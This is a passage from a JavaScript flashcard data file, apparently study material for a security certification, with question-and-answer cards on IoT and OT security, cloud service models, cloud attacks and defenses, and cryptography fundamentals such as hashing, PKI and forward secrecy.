                        { q: "IoT security challenges (list)?", a: "1) Weak/default passwords\n2) No encryption\n3) Insecure APIs\n4) No auto updates\n5) Limited processing power\n6) Physical accessibility\n7) Large attack surface" },
                        { q: "OT (Operational Technology)?", a: "Hardware + software for direct monitoring/control of physical devices, processes, events\nSCADA, PLCs, ICS" },
                        { q: "Stuxnet?", a: "Sophisticated worm found 2010; targeted Iranian nuclear facilities; Siemens SCADA centrifuge disruption\nFirst cyberweapon on physical infrastructure" }
                    ]
                }
            ]
        },
        {
            id: 19,
            title: "Cloud Computing",
            sections: [
                {
                    title: "Cloud Service Models & Vulnerabilities",
                    cards: [
                        { q: "Cloud service models (with examples)?", a: "IaaS (Infrastructure as a Service): VMs, networks, storage—AWS EC2, Azure VMs, Google Compute Engine\nPaaS (Platform as a Service): dev platforms, databases—Heroku, Google App Engine, Azure Functions\nSaaS (Software as a Service): complete apps—Office 365, Salesforce, Google Workspace\nFaaS (Function as a Service): serverless—AWS Lambda, Azure Functions" },
                        { q: "Cloud deployment models (detailed)?", a: "Public: over public internet (AWS, Azure)\nPrivate: dedicated for one org\nHybrid: public + private\nMulti-Cloud: multiple providers at once\nCommunity: shared by orgs w/ common requirements" },
                        { q: "Common cloud security vulnerabilities?", a: "Misconfigured storage (public S3)\nInsecure APIs + endpoints\nWeak IAM\nCross-account permission issues\nEncryption-misconfig data exposure\nShared technology (hypervisor escapes)\nInsufficient audit logs" },
                        { q: "Shared Responsibility Model?", a: "Provider: infrastructure, physical security, hypervisor\nCustomer: data, access management, OS config, applications\nIaaS: customer manages more (OS, apps, data)\nSaaS: provider manages more (apps, runtime, OS)" },
                        { q: "Securing cloud storage?", a: "Disable public access by default\nEncrypt at rest + in transit\nLeast-privilege IAM\nVersioning + logs\nPresigned URLs for temp access\nBucket policy audits\nAWS S3 Block Public Access, MFA Delete" }
                    ]
                },
                {
                    title: "Cloud Attacks & Security Frameworks",
                    cards: [
                        { q: "Cloud-specific attacks?", a: "Credential stuffing on cloud logins\nAPI key exposure (GitHub/public repos)\nIMDS: SSRF to 169.254.169.254, steal temp IAM creds\nCross-tenant isolation attacks\nContainer escape (Docker/Kubernetes)" },
                        { q: "Cloud cryptojacking?", a: "Unauthorized cryptomining on cloud resources; detect via unusual CPU/billing patterns\nMonitor + alert usage, least-privilege IAM, container scanning, cost audits" },
                        { q: "Cloud security tools?", a: "AWS: Config, GuardDuty, Inspector, Macie, Security Hub\nAzure: Security Center, Defender for Cloud, Policy\nGoogle: Security Command Center, Cloud Security Scanner\nThird-party: Prisma Cloud, Dome9, Wiz, Lacework\nOpen source: Prowler (AWS), Cloudsplaining (IAM)" },
                        { q: "CIS Benchmark for Cloud?", a: "Center for Internet Security cloud config benchmarks—AWS, Azure, GCP Foundation Benchmarks; security config best practices; automated compliance checking" }
                    ]
                },
                {
                    title: "Cloud Computing Overview",
                    cards: [
                        { q: "Cloud service models (list)?", a: "1) IaaS—VMs, storage, networking\n2) PaaS—dev platforms\n3) SaaS—apps over internet\n4) FaaS—serverless" },
                        { q: "Cloud deployment models (list)?", a: "1) Public—shared (AWS, Azure, GCP)\n2) Private—dedicated\n3) Hybrid—public + private\n4) Community—shared by orgs w/ common concerns" },
                        { q: "Common cloud security risks?", a: "1) Data breaches\n2) Insecure APIs\n3) Misconfigured storage (S3)\n4) Account hijacking\n5) Shared technology vulns\n6) Insufficient identity management\n7) Compliance + legal issues" },
                        { q: "Securing cloud environments?", a: "1) MFA everywhere\n2) Encrypt at rest + in transit\n3) Least privilege\n4) Regular audits\n5) CSPM tools\n6) Monitor logs + activity" }
                    ]
                }
            ]
        },
        {
            id: 20,
            title: "Cryptography",
            sections: [
                {
                    title: "Cryptography Fundamentals",
                    cards: [
                        { q: "Cryptography—core definition?", a: "Secure communication: plaintext→ciphertext\nGoals: confidentiality, integrity, authentication, non-repudiation" },
                        { q: "Encryption types (detailed)?", a: "Symmetric: same key enc/dec (AES, DES, 3DES, RC4, Blowfish)\nAsymmetric: public/private pairs (RSA, ECC, Diffie-Hellman)\nHash: one-way (MD5, SHA-1, SHA-256, SHA-512)" },
                        { q: "PKI—components?", a: "Manage digital certificates + public-key encryption\nCertificate Authority (CA), Registration Authority (RA), Digital Certificates, CRL, Certificate Revocation" },
                        { q: "Digital signature—how it works?", a: "Verify message authenticity + integrity\nAsymmetric: sender encrypts hash w/ private key; receiver decrypts w/ public key" },
                        { q: "Steganography vs cryptography?", a: "Hide secret data inside non-secret files (images, audio, video)\nCryptography hides content; steganography hides the message's existence" },
                        { q: "HMAC?", a: "Hash-based Message Authentication Code; hash + secret key→integrity + authentication\nIPsec, TLS, API auth" },
                        { q: "Forward Secrecy?", a: "Compromised long-term keys don't break past session keys; comms stay secure even if server private key stolen\nECDHE (Elliptic Curve Diffie-Hellman Key Exchange) provides it" },
                        { q: "Common hash functions + weaknesses?", a: "MD5: 128-bit, broken (collisions)\nSHA-1: 160-bit, deprecated (SHAttered attack 2017)\nSHA-256: 256-bit, secure (SHA-2)\nSHA-512: 512-bit, secure\nBLAKE3: modern, fast\nPassword hashing: bcrypt, scrypt, Argon2 (memory-hard)" }
                    ]
                },
                {
                    title: "Advanced Cryptography",
                    cards: [
                        { q: "Digital certificate?", a: "Electronic 'passport' binding recognized identity to a public key; issued by CA\nX.509 format\nSubject, Issuer, Public Key, Validity Period, Serial Number, Signature" },
                        { q: "Diffie-Hellman key exchange?", a: "Exchange keys securely over public channel; shared secret from no prior secrets\nDiscrete logarithm problem; foundation of many secure protocols" },
                        { q: "Quantum computing threat to cryptography?", a: "Quantum computers could break RSA + ECC; Shor's algorithm factors large numbers fast\nNIST standardizing post-quantum—lattice-based, hash-based, code-based\n10-30 years to practical attacks" },
                        { q: "Perfect Forward Secrecy (PFS)?", a: "Long-term private key compromise→past session keys stay secure\nUnique ephemeral keys per session; ECDHE in TLS\nBlocks mass surveillance from stored data" }
                    ]
                },
                {
                    title: "Cryptography Overview",
                    cards: [
                        { q: "Cryptography in one line?", a: "Secure communication: plaintext→ciphertext\nConfidentiality, integrity, authentication, non-repudiation" },
                        { q: "Encryption types (list)?", a: "1) Symmetric—same key enc/dec (AES, DES, 3DES, RC4, Blowfish)\n2) Asymmetric—public/private pairs (RSA, ECC, Diffie-Hellman)\n3) Hash—one-way (MD5, SHA-1, SHA-256, SHA-512)" },
                        { q: "PKI?", a: "Manage digital certificates + public-key encryption\nCA, RA, Digital Certificates, CRL, Certificate Revocation" },
                        { q: "Digital signature?", a: "Verify authenticity + integrity; sender encrypts hash w/ private key, receiver decrypts w/ public key" },
                        { q: "Steganography?", a: "Hide secret data in non-secret files (images, audio, video); hides message existence (cryptography hides content)" }
                    ]
                }
            ]
        }
    ]
};
